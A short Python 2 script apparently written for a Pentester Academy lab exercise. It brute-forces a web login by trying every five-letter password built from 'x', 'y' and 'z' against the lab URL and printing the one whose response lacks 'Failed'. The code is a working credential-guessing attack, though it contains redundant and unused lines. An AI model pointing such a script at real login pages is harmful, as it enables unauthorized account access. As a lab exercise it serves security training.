import requests
from requests.auth import HTTPBasicAuth

url = 'http://pentesteracademylab.appspot.com/lab/webapp/1'
USERNAME = 'admin@pentesteracademy.com' 
PASSWORD = 'aaaaa'
a = ['x','y','z']
x = ['a','a','a','a','a']
listToTry = [0]*(5*5*5*5*5)
i = 0
for j0 in range(0,3):
	for j1 in range(0,3):
		for j2 in range(0,3):
			for j3 in range(0,3):
				for j4 in range(0,3):
					x[0] = a[j0]
					x[1] = a[j1]
					x[2] = a[j2]
					x[3] = a[j3]
					x[4] = a[j4]   
					listToTry = ''.join(x)	
					PASSWORD = listToTry
					requests.get(url)
					payload = {'email': USERNAME,'password': PASSWORD}
					login_data = dict(username=USERNAME,password=PASSWORD)
					p = requests.get(url,params=payload)
					i= i+1
					if "Failed" in p.content:
						d = 1
					else:
						print i,PASSWORD,"***************** Sucess **********************"
				

	
	
